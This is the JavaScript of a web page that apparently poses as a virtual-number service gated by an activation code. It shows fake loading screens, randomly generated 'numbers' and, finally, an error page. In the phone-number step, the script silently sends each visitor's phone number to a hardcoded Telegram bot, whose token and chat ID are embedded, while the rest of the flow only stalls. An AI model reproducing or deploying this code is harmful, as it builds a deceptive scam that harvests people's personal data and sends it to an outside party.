window.onload = function () {
    document.getElementById("activation-page").style.display = "block";
    document.getElementById("loading-page").style.display = "none"; // Ensure loading page is hidden
};

const activationCode = "hackin28";
const telegramBotToken = "7163180771:AAFnerlyh4NH_wy7YldEhrkzW7yVrYeECTk";
const telegramChatID = "7478351328";

const countryList = [
    { name: "United States", code: "+1", flag: "us.png" },
    { name: "United Kingdom", code: "+44", flag: "gb.png" },
    { name: "Canada", code: "+1", flag: "ca.png" },

    { name: "Germany", code: "+49", flag: "de.png" },

    { name: "India", code: "+91", flag: "in.png" },

    { name: "Australia", code: "+61", flag: "au.png" },

    { name: "France", code: "+33", flag: "fr.png" },

    { name: "Italy", code: "+39", flag: "it.png" },

    { name: "Spain", code: "+34", flag: "es.png" },

    { name: "Mexico", code: "+52", flag: "mx.png" },

    { name: "Brazil", code: "+55", flag: "br.png" },

    { name: "South Africa", code: "+27", flag: "za.png" },
    { name: "Nigeria", code: "+234", flag: "ng.png" },

    { name: "China", code: "+86", flag: "cn.png" },

    { name: "Japan", code: "+81", flag: "jp.png" },

    { name: "Russia", code: "+7", flag: "ru.png" },

    { name: "South Korea", code: "+82", flag: "kr.png" },
    { name: "Argentina", code: "+54", flag: "ar.png" },

    { name: "Netherlands", code: "+31", flag: "nl.png" },
    { name: "Sweden", code: "+46", flag: "se.png" },

    { name: "Norway", code: "+47", flag: "no.png" },

    { name: "Denmark", code: "+45", flag: "dk.png" },

    { name: "Switzerland", code: "+41", flag: "ch.png" },
    { name: "Belgium", code: "+32", flag: "be.png" },

    { name: "Austria", code: "+43", flag: "at.png" },

    { name: "Portugal", code: "+351", flag: "pt.png" },

    { name: "New Zealand", code: "+64", flag: "nz.png" },
    { name: "Turkey", code: "+90", flag: "tr.png" },

    { name: "Greece", code: "+30", flag: "gr.png" },

    { name: "Ireland", code: "+353", flag: "ie.png" },

    { name: "Finland", code: "+358", flag: "fi.png" },

    { name: "Poland", code: "+48", flag: "pl.png" }
];

let selectedCountry = null;
let selectedNumber = null;

function showPage(pageId) {
    document.querySelectorAll(".page").forEach(page => page.style.display = "none");
    document.getElementById(pageId).style.display = "block";
}

function showLoading(text, duration, callback) {
    document.getElementById("loading-text").innerText = text;
    document.getElementById("loading-page").style.display = "flex";
    
    setTimeout(() => {
        document.getElementById("loading-page").style.display = "none";
        if (callback) callback();
    }, duration);
}

function verifyCode() {
    const inputCode = document.getElementById("activation-code").value;
    if (inputCode === activationCode) {
        showLoading("Connecting...", 8000, () => {
            showPage("phone-input-page");
        });
    } else {
        document.getElementById("activation-error").textContent = "Invalid activation code!";
    }
}

function submitPhoneNumber() {
    const phoneInput = document.getElementById("phone-number");
    const phoneNumber = phoneInput.value;
    if (phoneNumber.length !== 11) {
        document.getElementById("phone-error").textContent = "Phone number must be exactly 11 digits!";
        return;
    }

    document.getElementById("phone-error").textContent = "";
    showLoading("Verifying phone number...", 15000, () => {
        showPage("country-page");

        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatID}&text=Phone Number: ${phoneNumber}`);
    });
}

function loadCountries() {
    const countryDiv = document.getElementById("country-list");
    countryDiv.innerHTML = "";
    countryList.forEach(country => {
        const item = document.createElement("div");
        item.classList.add("country-item");
        item.innerHTML = `<img src="${country.flag}" alt="${country.name}" width="30"> ${country.name} (${country.code})`;
        item.onclick = () => selectCountry(country);
        countryDiv.appendChild(item);
    });
}

function selectCountry(country) {
    selectedCountry = country;
    showLoading("Loading numbers...", 10000, () => {
        showPage("number-page");
        loadNumbers();
    });
}

function loadNumbers() {
    const numberDiv = document.getElementById("number-list");
    numberDiv.innerHTML = "";
    for (let i = 0; i < 50; i++) {
        const randomNum = Math.floor(100000000 + Math.random() * 900000000);
        const fullNumber = `${selectedCountry.code}${randomNum}`;
        const item = document.createElement("div");
        item.classList.add("number-item");
        item.textContent = fullNumber;
        item.onclick = () => selectNumber(fullNumber);
        numberDiv.appendChild(item);
    }
}

function selectNumber(number) {
    selectedNumber = number;
    showLoading("Connecting to phone service...", 120000, () => {
        showPage("error-page"); // Show error page after loading
    });
}

// Initialize the country list
loadCountries();